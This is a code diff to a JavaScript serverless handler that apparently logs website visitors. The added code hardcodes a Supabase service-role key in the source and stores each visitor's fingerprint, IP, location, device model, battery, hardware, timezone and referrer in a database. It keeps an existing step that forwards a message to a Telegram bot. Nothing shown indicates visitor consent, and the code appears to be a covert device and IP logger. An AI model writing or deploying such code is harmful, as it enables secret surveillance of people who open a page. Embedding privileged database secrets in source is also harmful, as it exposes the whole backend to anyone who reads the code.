@@ -70,7 +70,40 @@ export default async function handler(req, res) {
 ----------------------------
 `;
 
+    // Supabase ma'lumotlari
+    const SUPABASE_URL = 'https://hhsasepeklroqbvnaewg.supabase.co';
+    const SUPABASE_KEY = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Imhoc2FzZXBla2xyb3Fidm5hZXdnIiwicm9sZSI6InNlcnZpY2Vfcm9sZSIsImlhdCI6MTc3NzY2NzM5MiwiZXhwIjoyMDkzMjQzMzkyfQ.U4wV6U3dCbl29f8X3Jng6EMfoPoPpxYLkJhF1xvPhys';
+
     try {
+        // 1. Supabase-ga saqlash
+        await fetch(`${SUPABASE_URL}/rest/v1/visitors`, {
+            method: 'POST',
+            headers: {
+                'apikey': SUPABASE_KEY,
+                'Authorization': `Bearer ${SUPABASE_KEY}`,
+                'Content-Type': 'application/json',
+                'Prefer': 'return=minimal'
+            },
+            body: JSON.stringify({
+                fingerprint: data.fingerprint,
+                device_model: data.exactModel || deviceModel,
+                browser_app: browserName,
+                ip_address: ip,
+                location: `${data.city || ''}, ${data.country || ''}`,
+                battery: `${data.battery?.level || ''} (${data.battery?.charging || ''})`,
+                ram: data.ram?.toString(),
+                cpu_cores: data.cores?.toString(),
+                gpu: data.gpu,
+                timezone: data.timezone,
+                language: data.language,
+                connection: JSON.stringify(data.connection),
+                screen_size: data.screenSize,
+                referrer: data.referrer,
+                user_agent: ua
+            })
+        });
+
+        // 2. Telegram-ga yuborish
         await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
@@ -80,6 +113,7 @@ export default async function handler(req, res) {
                 parse_mode: 'Markdown'
             })
         });
+        
         return res.status(200).json({ success: true });
     } catch (error) {
         return res.status(500).json({ error: error.message });
